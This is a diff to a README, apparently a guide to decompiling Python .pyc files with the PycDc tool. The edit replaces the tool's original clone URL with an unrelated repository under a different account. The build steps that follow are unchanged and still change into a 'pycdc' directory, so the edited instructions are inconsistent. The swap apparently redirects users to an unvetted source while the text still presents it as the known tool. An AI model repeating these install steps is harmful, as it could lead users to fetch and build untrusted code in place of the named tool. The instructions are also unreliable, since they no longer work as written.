@@ -11,7 +11,7 @@ then you can decompile pyc to py with Famous PycDc tool.
 first of all download and install PycDc ( PYC Decrypte )
 
 ```bash
-git clone https://github.com/zrax/pycdc
+git clone https://github.com/master-alam-vau-ok-441/Marshal.git
 sudo apt install cmake
 cd pycdc&& cmake .
 make
